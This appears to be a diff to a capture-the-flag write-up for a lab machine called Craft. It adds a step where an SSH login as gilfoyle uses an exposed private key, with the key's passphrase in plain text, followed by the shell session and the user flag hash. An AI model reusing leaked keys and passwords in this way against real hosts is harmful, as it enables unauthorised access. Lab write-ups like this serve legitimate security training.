@@ -313,9 +313,55 @@ print(cur.fetchall())"
 ```
 
 
-logging in as gilfoyle reveals a new repo:
+logging in as gilfoyle reveals a new repo with a private key exposed:
 
 
+```
+ssh gilfoyle@craft.htb -i id_rsa.key        
+** WARNING: connection is not using a post-quantum key exchange algorithm.
+** This session may be vulnerable to "store now, decrypt later" attacks.
+** The server may need to be upgraded. See https://openssh.com/pq.html
+
+
+  .   *   ..  . *  *
+*  * @()Ooc()*   o  .
+    (Q@*0CG*O()  ___
+   |\_________/|/ _ \
+   |  |  |  |  | / | |
+   |  |  |  |  | | | |
+   |  |  |  |  | | | |
+   |  |  |  |  | | | |
+   |  |  |  |  | | | |
+   |  |  |  |  | \_| |
+   |  |  |  |  |\___/
+   |\_|__|__|_/|
+    \_________/
+
+
+
+Enter passphrase for key 'id_rsa.key': #ZEU3N8WNM2rh4T (same as pw)
+Linux craft.htb 6.1.0-12-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.52-1 (2023-09-07) x86_64
+
+The programs included with the Debian GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+Last login: Thu Nov 16 08:03:39 2023 from 10.10.14.23
+gilfoyle@craft:~$ id
+uid=1001(gilfoyle) gid=1001(gilfoyle) groups=1001(gilfoyle)
+gilfoyle@craft:~$ ls
+user.txt
+gilfoyle@craft:~$ 
+
+```
+
+```
+gilfoyle@craft:~$ cat user.txt
+2cc93f35a5ee8e3c2c87352b2f0f5d13
+
+```
 
 ---
 ## Privilege Escalation
